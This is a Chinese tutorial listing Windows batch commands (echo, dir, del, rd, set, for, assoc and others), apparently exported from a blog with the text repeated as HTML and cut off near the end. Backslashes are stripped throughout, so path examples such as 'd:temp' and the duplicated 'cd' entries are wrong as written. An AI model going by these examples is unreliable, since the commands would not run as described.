一、批处理概念\n\n- 批处理文件：包含DOS命令的可编辑可执行文件\n- 批处理：可以对某一对象批量操作的文件\n\n<!--more-->\n\n## 二、批处理命令简介\n\n### 命令1~10\n\n```\n1 echo 和 @\n回显命令\n@  #关闭单行回显\necho off  #从下一行开始关闭回显\n@echo off  #从本行开始关闭回显。一般批处理第一行都是这个\necho on #从下一行开始打开回显\necho #显示当前是 echo off 状态还是 echo on 状态\necho. #输出一个”回车换行”，空白行\n#(同echo, echo; echo+ echo[ echo] echo/ echo)\n\n2 errorlevel\necho %errorlevel%\n每个命令运行结束，可以用这个命令行格式查看返回码\n默认值为0，一般命令执行出错会设 errorlevel 为1\n\n3 dir\n显示文件夹内容\ndir #显示当前目录中的文件和子目录\ndir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件\ndir c: /a:d #显示 C 盘当前目录中的目录\ndir c: /a:-d #显示 C 盘根目录中的文件\ndir c: /b/p #/b只显示文件名，/p分页显示\ndir *.exe /s #显示当前目录和子目录里所有的.exe文件\n\n4 cd\n切换目录\ncd #进入根目录\ncd #显示当前目录\ncd /d d:sdk #可以同时更改盘符和目录\n\n5 md\n创建目录\nmd d:abc #如果 d:a 不存在，将会自动创建中级目录\n#如果命令扩展名被停用，则需要键入 mkdir abc\n\n6 rd\n删除目录\nrd abc #删除当前目录里的 abc 子目录，要求为空目录\nrd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式\n\n7 del\n删除文件\ndel d:test.txt #删除指定文件，不能是隐藏、系统、只读文件\ndel /q/a/f d:temp*.*\n删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\ndel /q/a/f/s d:temp*.*\n删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\n\n8 ren\n重命名命令\nren d:temp tmp #支持对文件夹的重命名\n\n9 cls\n清屏\n10 type\n显示文件内容\ntype c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码\ntype *.txt #显示当前目录里所有.txt文件的内容\n\n\n```\n\n### 命令11~20\n\n```\n11 copy\n拷贝文件\ncopy c:test.txt d:test.bak\n复制 c:test.txt 文件到 d: ，并重命名为 test.bak\ncopy con test.txt\n从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件\ncon代表屏幕，prn代表打印机，nul代表空设备\ncopy 1.txt + 2.txt 3.txt\n合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件\n如果不指定 3.txt ，则保存到 1.txt\ncopy test.txt +\n复制文件到自己，实际上是修改了文件日期\n\n12 title\n设置cmd窗口的标题\ntitle 新标题 #可以看到cmd窗口的标题栏变了\n\n13 ver\n显示系统版本\n\n14 label 和 vol\n设置卷标\nvol #显示卷标\nlabel #显示卷标，同时提示输入新卷标\nlabel c:system #设置C盘的卷标为 system\n\n15 pause\n暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束\n\n16 rem 和 ::\n注释命令\n注释行不执行操作\n\n17 date 和 time\n日期和时间\ndate #显示当前日期，并提示输入新日期，按\"回车\"略过输入\ndate/t #只显示当前日期，不提示输入新日期\ntime #显示当前时间，并提示输入新时间，按\"回车\"略过输入\ntime/t #只显示当前时间，不提示输入新时间\n\n18 goto 和 :\n跳转命令\n:label #行首为:表示该行是标签行，标签行不执行操作\ngoto label #跳转到指定的标签那一行\n\n19 find (外部命令)\n查找命令\nfind \"abc\" c:test.txt\n在 c:test.txt 文件里查找含 abc 字符串的行\n如果找不到，将设 errorlevel 返回码为1\nfind /i “abc” c:test.txt\n查找含 abc 的行，忽略大小写\nfind /c \"abc\" c:test.txt\n显示含 abc 的行的行数\n\n20 more (外部命令)\n逐屏显示\nmore c:test.txt #逐屏显示 c:test.txt 的文件内容\n```\n\n\n\n### 命令21~30\n\n```\n21 tree\n显示目录结构\ntree d: #显示D盘的文件目录结构\n\n22 &\n顺序执行多条命令，而不管命令是否执行成功\n\n23 &&\n顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\nfind \"ok\" c:test.txt && echo 成功\n如果找到了\"ok\"字样，就显示\"成功\"，找不到就不显示\n\n24 ||\n顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令\nfind \"ok\" c:test.txt || echo 不成功\n如果找不到\"ok\"字样，就显示\"不成功\"，找到了就不显示\n\n25 |\n管道命令\ndir *.* /s/a | find /c \".exe\"\n管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令\n该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数\ntype c:test.txt|more\n这个和 more c:test.txt 的效果是一样的\n\n26 > 和 >>\n输出重定向命令\n> 清除文件中原有的内容后再写入\n>> 追加内容到文件末尾，而不会清除原有的内容\n主要将本来显示在屏幕上的内容输出到指定文件中\n指定文件如果不存在，则自动生成该文件\ntype c:test.txt >prn\n屏幕上不显示文件内容，转向输出到打印机\necho hello world>con\n在屏幕上显示hello world，实际上所有输出都是默认 >con 的\ncopy c:test.txt f: >nul\n拷贝文件，并且不显示\"文件复制成功\"的提示信息，但如果f盘不存在，还是会显示出错信息\ncopy c:test.txt f: >nul 2>nul\n不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息\necho ^^W ^> ^W>c:test.txt\n生成的文件内容为 ^W > W\n^ 和 > 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号\n\n27 <\n从文件中获得输入信息，而不是从屏幕上\n一般用于 date time label 等需要等待输入的命令\n@echo off\necho 2005-05-01>temp.txt\ndate <temp.txt\ndel temp.txt\n这样就可以不等待输入直接修改当前日期\n\n28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*\n命令行传递给批处理的参数  //上一个命令的结果作为参数\n%0 批处理文件本身\n%1 第一个参数\n%9 第九个参数\n%* 从第一个参数开始的所有参数\n批参数(%n)的替代已被增强。您可以使用以下语法:\n%~1 - 删除引号(\" )， 扩充 %1\n%~f1 - 将 %1 扩充到一个完全合格的路径名\n%~d1 - 仅将 %1 扩充到一个驱动器号\n%~p1 - 仅将 %1 扩充到一个路径\n%~n1 - 仅将 %1 扩充到一个文件名\n%~x1 - 仅将 %1 扩充到一个文件扩展名\n%~s1 - 扩充的路径指含有短名\n%~a1 - 将 %1 扩充到文件属性\n%~t1 - 将 %1 扩充到文件的日期/时间\n%~z1 - 将 %1 扩充到文件的大小\n%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1\n扩充到找到的第一个完全合格的名称。如果环境\n变量名未被定义，或者没有找到文件，此组合键会\n扩充到空字符串\n可以组合修定符来取得多重结果:\n%~dp1 - 只将 %1 扩展到驱动器号和路径\n%~nx1 - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。\n可以参照 call/? 或 for/? 看出每个参数的含意\necho load \"%%1\" \"%%2\">c:test.txt\n生成的文件内容为 load \"%1\"  \"%2\"\n批处理文件里，用这个格式把命令行参数输出到文件\n\n29 if\n判断命令\nif \"%1\"==\"/a\" echo 第一个参数是/a\nif /i \"%1\" equ \"/a\" echo 第一个参数是/a\n/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?\nif exist c:test.bat echo 存在c:test.bat文件\nif not exist c:windows (\necho 不存在c:windows文件夹\n)\nif exist c:test.bat (\necho 存在c:test.bat\n) else (\necho 不存在c:test.bat\n)\n30 setlocal 和 endlocal\n设置”命令扩展名”和”延缓环境变量扩充”\nSETLOCAL ENABLEEXTENSIONS #启用\"命令扩展名\"\nSETLOCAL DISABLEEXTENSIONS #停用\"命令扩展名\"\nSETLOCAL ENABLEDELAYEDEXPANSION #启用\"延缓环境变量扩充\"\nSETLOCAL DISABLEDELAYEDEXPANSION #停用\"延缓环境变量扩充\"\nENDLOCAL #恢复到使用SETLOCAL语句以前的状态\n“命令扩展名”默认为启用\n“延缓环境变量扩充”默认为停用\n批处理结束系统会自动恢复默认值\n可以修改注册表以禁用\"命令扩展名\"，详见 cmd /? 。所以用到\"命令扩展名\"的程\n序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确\n保程序能在其它系统上正确运行\n\"延缓环境变量扩充\"主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程\n```\n\n### 命令31~39\n\n```\n31 set\n设置变量\n引用变量可在变量名前后加 % ，即 %变量名%\nset #显示目前所有可用的变量，包括系统变量和自定义的变量\necho %SystemDrive% #显示系统盘盘符。系统变量可以直接引用\nset p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1\nset p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2\necho %p% #显示变量p代表的字符串，即aa1bb1aa2bb2\necho %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2\necho %p:~6,3% #显示第6个字符以后的3个字符，即aa2\necho %p:~0,3% #显示前3个字符，即aa1\necho %p:~-2% #显示最后面的2个字符，即b2\necho %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b\necho %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2\necho %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2\necho %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2\nset p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2\nset /a p=39 #设置p为数值型变量，值为39\nset /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3\nset /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用\nset /a p=”1&0″ #”与”运算，要加引号。其它支持的运算符参见set/?\nset p= #取消p变量\nset /p p=请输入\n屏幕上显示”请输入”，并会将输入的字符串赋值给变量p\n注意这条可以用来取代 choice 命令\n注意变量在 if 和 for 的复合语句里是一次性全部替换的，如\n@echo off\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho %p%\n)\n结果将显示\naaa\naaa\n因为在读取 if 语句时已经将所有 %p% 替换为aaa\n这里的\"替换\"，在 /? 帮助里就是指\"扩充\"、\"环境变量扩充\"\n可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!\n@echo off\nSETLOCAL ENABLEDELAYEDEXPANSION\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho !p!\n)\nENDLOCAL\n结果将显示\naaa\nbbb\n还有几个动态变量，运行 set 看不到\n%CD% #代表当前目录的字符串\n%DATE% #当前日期\n%TIME% #当前时间\n%RANDOM% #随机整数，介于0~32767\n%ERRORLEVEL% #当前 ERRORLEVEL 值\n%CMDEXTVERSION% #当前命令处理器扩展名版本号\n%CMDCMDLINE% #调用命令处理器的原始命令行\n可以用echo命令查看每个变量值，如 echo %time%\n注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到\n\n32 start\n批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令\n\n33 call\n批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行\n有时有的应用程序用start调用出错的，也可以call调用\n\n34 choice (外部命令)\n选择命令\n让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……\nwin98里是choice.com\nwin2000pro里没有，可以从win98里拷过来\nwin2003里是choice.exe\nchoice /N /C y /T 5 /D y>nul\n延时5秒\n\n35 assoc 和 ftype\n文件关联\nassoc 设置'文件扩展名'关联，关联到'文件类型'\nftype 设置'文件类型'关联，关联到'执行程序和参数'\n当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile '文件类型'\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1\n可以在\"文件夹选项\"→\"文件类型\"里修改这2种关联\nassoc #显示所有'文件扩展名'关联\nassoc .txt #显示.txt代表的'文件类型'，结果显示 .txt=txtfile\nassoc .doc #显示.doc代表的'文件类型'，结果显示 .doc=Word.Document.8\nassoc .exe #显示.exe代表的'文件类型'，结果显示 .exe=exefile\nftype #显示所有'文件类型'关联\nftype exefile #显示exefile类型关联的命令行，结果显示 exefile=\"%1\" %*\nassoc .txt=Word.Document.8\n设置.txt为word类型的文档，可以看到.txt文件的图标都变了\nassoc .txt=txtfile\n恢复.txt的正确关联\nftype exefile=\"%1\" %*\n恢复 exefile 的正确关联\n如果该关联已经被破坏，可以运行 command.com ，再输入这条命令\n\n36 pushd 和 popd\n切换当前目录\n@echo off\nc: & cd & md mp3 #在 C: 建立 mp3 文件夹\nmd d:mp4 #在 D: 建立 mp4 文件夹\ncd /d d:mp4 #更改当前目录为 d:mp4\npushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3\npopd #恢复当前目录为刚才保存的 d:mp4\n\n37 for\n循环命令\n这个比较复杂，请对照 for/? 来看\nfor %%i in (c: d: e: f:) do echo %%i\n依次调用小括号里的每个字符串，执行 do 后面的命令\n注意%%i，在批处理中 for 语句调用参数用2个%\n默认的字符串分隔符是\"空格键\"，\"Tab键\"，\"回车键\"\nfor %%i in (*.txt) do find \"abc\" %%i\n对当前目录里所有的txt文件执行 find 命令\nfor /r . %%i in (*.txt) do find \"abc\" %%i\n在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行\nfor /r . %%i in (.) do echo %%~pni\n显示当前目录名和所有子目录名，包括路径，不包括盘符\nfor /r d:mp3 %%i in (*.mp3) do echo %%i>>d:mp3.txt\n把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去\nfor /l %%i in (2,1,8) do echo %%i\n生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1\nfor /f %%i in ('set') do echo %%i\n对 set 命令的输出结果循环调用，每行一个\nfor /f \"eol=P\" %%i in ('set') do echo %%i\n取 set 命令的输出结果，忽略以 P 开头的那几行\nfor /f %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称\nfor /f \"delims=\" %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称\nfor /f \"skip=5 tokens=4\" %%a in ('dir') do echo %%a\n对 dir 命令的结果，跳过前面5行，余下的每行取第4列\n每列之间的分隔符为默认的\"空格\"\n可以注意到 dir 命令输出的前5行是没有文件名的\nfor /f \"tokens=1,2,3 delims=- \" %%a in ('date /t') do (\necho %%a\necho %%b\necho %%c\n)\n对 date /t 的输出结果，每行取1、2、3列\n第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列\n分隔符指定为 - 和\"空格\"，注意 delims=- 后面有个\"空格\"\n其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的\nfor /f \"tokens=2* delims=- \" %%a in ('date /t') do echo %%b\n取第2列给 %%a ，其后的列都给 %%b\n\n38 subst (外部命令)\n映射磁盘。\nsubst z: serverd #这样输入z:就可以访问serverd了\nsubst z: /d #取消该映射\nsubst #显示目前所有的映时\n\n39 xcopy (外部命令)\n文件拷贝\nxcopy d:mp3 e:mp3 /s/e/i/y\n复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件\n加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问\n```\n\n","slug":"bat批处理文件","published":1,"date":"2021-03-24T04:15:03.100Z","updated":"2021-03-24T04:15:03.149Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl423000fdsvtd0kyhpmj","content":"<hr>\n<hr>\n<h1 id=\"bat批处理命令及解释\"><a href=\"#bat批处理命令及解释\" class=\"headerlink\" title=\"bat批处理命令及解释\"></a>bat批处理命令及解释</h1><p><a href=\"https://www.cnblogs.com/xpwi/p/9626959.html\">相关原文链接</a></p>\n<h2 id=\"一、批处理概念\"><a href=\"#一、批处理概念\" class=\"headerlink\" title=\"一、批处理概念\"></a>一、批处理概念</h2><ul>\n<li>批处理文件：包含DOS命令的可编辑可执行文件</li>\n<li>批处理：可以对某一对象批量操作的文件</li>\n</ul>\n<span id=\"more\"></span>\n\n<h2 id=\"二、批处理命令简介\"><a href=\"#二、批处理命令简介\" class=\"headerlink\" title=\"二、批处理命令简介\"></a>二、批处理命令简介</h2><h3 id=\"命令1-10\"><a href=\"#命令1-10\" class=\"headerlink\" title=\"命令1~10\"></a>命令1~10</h3><pre><code>1 echo 和 @\n回显命令\n@  #关闭单行回显\necho off  #从下一行开始关闭回显\n@echo off  #从本行开始关闭回显。一般批处理第一行都是这个\necho on #从下一行开始打开回显\necho #显示当前是 echo off 状态还是 echo on 状态\necho. #输出一个”回车换行”，空白行\n#(同echo, echo; echo+ echo[ echo] echo/ echo)\n\n2 errorlevel\necho %errorlevel%\n每个命令运行结束，可以用这个命令行格式查看返回码\n默认值为0，一般命令执行出错会设 errorlevel 为1\n\n3 dir\n显示文件夹内容\ndir #显示当前目录中的文件和子目录\ndir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件\ndir c: /a:d #显示 C 盘当前目录中的目录\ndir c: /a:-d #显示 C 盘根目录中的文件\ndir c: /b/p #/b只显示文件名，/p分页显示\ndir *.exe /s #显示当前目录和子目录里所有的.exe文件\n\n4 cd\n切换目录\ncd #进入根目录\ncd #显示当前目录\ncd /d d:sdk #可以同时更改盘符和目录\n\n5 md\n创建目录\nmd d:abc #如果 d:a 不存在，将会自动创建中级目录\n#如果命令扩展名被停用，则需要键入 mkdir abc\n\n6 rd\n删除目录\nrd abc #删除当前目录里的 abc 子目录，要求为空目录\nrd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式\n\n7 del\n删除文件\ndel d:test.txt #删除指定文件，不能是隐藏、系统、只读文件\ndel /q/a/f d:temp*.*\n删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\ndel /q/a/f/s d:temp*.*\n删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\n\n8 ren\n重命名命令\nren d:temp tmp #支持对文件夹的重命名\n\n9 cls\n清屏\n10 type\n显示文件内容\ntype c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码\ntype *.txt #显示当前目录里所有.txt文件的内容\n\n</code></pre><h3 id=\"命令11-20\"><a href=\"#命令11-20\" class=\"headerlink\" title=\"命令11~20\"></a>命令11~20</h3><pre><code>11 copy\n拷贝文件\ncopy c:test.txt d:test.bak\n复制 c:test.txt 文件到 d: ，并重命名为 test.bak\ncopy con test.txt\n从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件\ncon代表屏幕，prn代表打印机，nul代表空设备\ncopy 1.txt + 2.txt 3.txt\n合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件\n如果不指定 3.txt ，则保存到 1.txt\ncopy test.txt +\n复制文件到自己，实际上是修改了文件日期\n\n12 title\n设置cmd窗口的标题\ntitle 新标题 #可以看到cmd窗口的标题栏变了\n\n13 ver\n显示系统版本\n\n14 label 和 vol\n设置卷标\nvol #显示卷标\nlabel #显示卷标，同时提示输入新卷标\nlabel c:system #设置C盘的卷标为 system\n\n15 pause\n暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束\n\n16 rem 和 ::\n注释命令\n注释行不执行操作\n\n17 date 和 time\n日期和时间\ndate #显示当前日期，并提示输入新日期，按&quot;回车&quot;略过输入\ndate/t #只显示当前日期，不提示输入新日期\ntime #显示当前时间，并提示输入新时间，按&quot;回车&quot;略过输入\ntime/t #只显示当前时间，不提示输入新时间\n\n18 goto 和 :\n跳转命令\n:label #行首为:表示该行是标签行，标签行不执行操作\ngoto label #跳转到指定的标签那一行\n\n19 find (外部命令)\n查找命令\nfind &quot;abc&quot; c:test.txt\n在 c:test.txt 文件里查找含 abc 字符串的行\n如果找不到，将设 errorlevel 返回码为1\nfind /i “abc” c:test.txt\n查找含 abc 的行，忽略大小写\nfind /c &quot;abc&quot; c:test.txt\n显示含 abc 的行的行数\n\n20 more (外部命令)\n逐屏显示\nmore c:test.txt #逐屏显示 c:test.txt 的文件内容</code></pre><h3 id=\"命令21-30\"><a href=\"#命令21-30\" class=\"headerlink\" title=\"命令21~30\"></a>命令21~30</h3><pre><code>21 tree\n显示目录结构\ntree d: #显示D盘的文件目录结构\n\n22 &amp;\n顺序执行多条命令，而不管命令是否执行成功\n\n23 &amp;&amp;\n顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\nfind &quot;ok&quot; c:test.txt &amp;&amp; echo 成功\n如果找到了&quot;ok&quot;字样，就显示&quot;成功&quot;，找不到就不显示\n\n24 ||\n顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令\nfind &quot;ok&quot; c:test.txt || echo 不成功\n如果找不到&quot;ok&quot;字样，就显示&quot;不成功&quot;，找到了就不显示\n\n25 |\n管道命令\ndir *.* /s/a | find /c &quot;.exe&quot;\n管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令\n该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数\ntype c:test.txt|more\n这个和 more c:test.txt 的效果是一样的\n\n26 &gt; 和 &gt;&gt;\n输出重定向命令\n&gt; 清除文件中原有的内容后再写入\n&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容\n主要将本来显示在屏幕上的内容输出到指定文件中\n指定文件如果不存在，则自动生成该文件\ntype c:test.txt &gt;prn\n屏幕上不显示文件内容，转向输出到打印机\necho hello world&gt;con\n在屏幕上显示hello world，实际上所有输出都是默认 &gt;con 的\ncopy c:test.txt f: &gt;nul\n拷贝文件，并且不显示&quot;文件复制成功&quot;的提示信息，但如果f盘不存在，还是会显示出错信息\ncopy c:test.txt f: &gt;nul 2&gt;nul\n不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息\necho ^^W ^&gt; ^W&gt;c:test.txt\n生成的文件内容为 ^W &gt; W\n^ 和 &gt; 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号\n\n27 &lt;\n从文件中获得输入信息，而不是从屏幕上\n一般用于 date time label 等需要等待输入的命令\n@echo off\necho 2005-05-01&gt;temp.txt\ndate &lt;temp.txt\ndel temp.txt\n这样就可以不等待输入直接修改当前日期\n\n28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*\n命令行传递给批处理的参数  //上一个命令的结果作为参数\n%0 批处理文件本身\n%1 第一个参数\n%9 第九个参数\n%* 从第一个参数开始的所有参数\n批参数(%n)的替代已被增强。您可以使用以下语法:\n%~1 - 删除引号(&quot; )， 扩充 %1\n%~f1 - 将 %1 扩充到一个完全合格的路径名\n%~d1 - 仅将 %1 扩充到一个驱动器号\n%~p1 - 仅将 %1 扩充到一个路径\n%~n1 - 仅将 %1 扩充到一个文件名\n%~x1 - 仅将 %1 扩充到一个文件扩展名\n%~s1 - 扩充的路径指含有短名\n%~a1 - 将 %1 扩充到文件属性\n%~t1 - 将 %1 扩充到文件的日期/时间\n%~z1 - 将 %1 扩充到文件的大小\n%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1\n扩充到找到的第一个完全合格的名称。如果环境\n变量名未被定义，或者没有找到文件，此组合键会\n扩充到空字符串\n可以组合修定符来取得多重结果:\n%~dp1 - 只将 %1 扩展到驱动器号和路径\n%~nx1 - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。\n可以参照 call/? 或 for/? 看出每个参数的含意\necho load &quot;%%1&quot; &quot;%%2&quot;&gt;c:test.txt\n生成的文件内容为 load &quot;%1&quot;  &quot;%2&quot;\n批处理文件里，用这个格式把命令行参数输出到文件\n\n29 if\n判断命令\nif &quot;%1&quot;==&quot;/a&quot; echo 第一个参数是/a\nif /i &quot;%1&quot; equ &quot;/a&quot; echo 第一个参数是/a\n/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?\nif exist c:test.bat echo 存在c:test.bat文件\nif not exist c:windows (\necho 不存在c:windows文件夹\n)\nif exist c:test.bat (\necho 存在c:test.bat\n) else (\necho 不存在c:test.bat\n)\n30 setlocal 和 endlocal\n设置”命令扩展名”和”延缓环境变量扩充”\nSETLOCAL ENABLEEXTENSIONS #启用&quot;命令扩展名&quot;\nSETLOCAL DISABLEEXTENSIONS #停用&quot;命令扩展名&quot;\nSETLOCAL ENABLEDELAYEDEXPANSION #启用&quot;延缓环境变量扩充&quot;\nSETLOCAL DISABLEDELAYEDEXPANSION #停用&quot;延缓环境变量扩充&quot;\nENDLOCAL #恢复到使用SETLOCAL语句以前的状态\n“命令扩展名”默认为启用\n“延缓环境变量扩充”默认为停用\n批处理结束系统会自动恢复默认值\n可以修改注册表以禁用&quot;命令扩展名&quot;，详见 cmd /? 。所以用到&quot;命令扩展名&quot;的程\n序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确\n保程序能在其它系统上正确运行\n&quot;延缓环境变量扩充&quot;主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程</code></pre><h3 id=\"命令31-39\"><a href=\"#命令31-39\" class=\"headerlink\" title=\"命令31~39\"></a>命令31~39</h3><pre><code>31 set\n设置变量\n引用变量可在变量名前后加 % ，即 %变量名%\nset #显示目前所有可用的变量，包括系统变量和自定义的变量\necho %SystemDrive% #显示系统盘盘符。系统变量可以直接引用\nset p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1\nset p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2\necho %p% #显示变量p代表的字符串，即aa1bb1aa2bb2\necho %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2\necho %p:~6,3% #显示第6个字符以后的3个字符，即aa2\necho %p:~0,3% #显示前3个字符，即aa1\necho %p:~-2% #显示最后面的2个字符，即b2\necho %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b\necho %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2\necho %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2\necho %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2\nset p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2\nset /a p=39 #设置p为数值型变量，值为39\nset /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3\nset /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用\nset /a p=”1&amp;0″ #”与”运算，要加引号。其它支持的运算符参见set/?\nset p= #取消p变量\nset /p p=请输入\n屏幕上显示”请输入”，并会将输入的字符串赋值给变量p\n注意这条可以用来取代 choice 命令\n注意变量在 if 和 for 的复合语句里是一次性全部替换的，如\n@echo off\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho %p%\n)\n结果将显示\naaa\naaa\n因为在读取 if 语句时已经将所有 %p% 替换为aaa\n这里的&quot;替换&quot;，在 /? 帮助里就是指&quot;扩充&quot;、&quot;环境变量扩充&quot;\n可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!\n@echo off\nSETLOCAL ENABLEDELAYEDEXPANSION\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho !p!\n)\nENDLOCAL\n结果将显示\naaa\nbbb\n还有几个动态变量，运行 set 看不到\n%CD% #代表当前目录的字符串\n%DATE% #当前日期\n%TIME% #当前时间\n%RANDOM% #随机整数，介于0~32767\n%ERRORLEVEL% #当前 ERRORLEVEL 值\n%CMDEXTVERSION% #当前命令处理器扩展名版本号\n%CMDCMDLINE% #调用命令处理器的原始命令行\n可以用echo命令查看每个变量值，如 echo %time%\n注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到\n\n32 start\n批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令\n\n33 call\n批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行\n有时有的应用程序用start调用出错的，也可以call调用\n\n34 choice (外部命令)\n选择命令\n让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……\nwin98里是choice.com\nwin2000pro里没有，可以从win98里拷过来\nwin2003里是choice.exe\nchoice /N /C y /T 5 /D y&gt;nul\n延时5秒\n\n35 assoc 和 ftype\n文件关联\nassoc 设置&#39;文件扩展名&#39;关联，关联到&#39;文件类型&#39;\nftype 设置&#39;文件类型&#39;关联，关联到&#39;执行程序和参数&#39;\n当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile &#39;文件类型&#39;\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1\n可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联\nassoc #显示所有&#39;文件扩展名&#39;关联\nassoc .txt #显示.txt代表的&#39;文件类型&#39;，结果显示 .txt=txtfile\nassoc .doc #显示.doc代表的&#39;文件类型&#39;，结果显示 .doc=Word.Document.8\nassoc .exe #显示.exe代表的&#39;文件类型&#39;，结果显示 .exe=exefile\nftype #显示所有&#39;文件类型&#39;关联\nftype exefile #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %*\nassoc .txt=Word.Document.8\n设置.txt为word类型的文档，可以看到.txt文件的图标都变了\nassoc .txt=txtfile\n恢复.txt的正确关联\nftype exefile=&quot;%1&quot; %*\n恢复 exefile 的正确关联\n如果该关联已经被破坏，可以运行 command.com ，再输入这条命令\n\n36 pushd 和 popd\n切换当前目录\n@echo off\nc: &amp; cd &amp; md mp3 #在 C: 建立 mp3 文件夹\nmd d:mp4 #在 D: 建立 mp4 文件夹\ncd /d d:mp4 #更改当前目录为 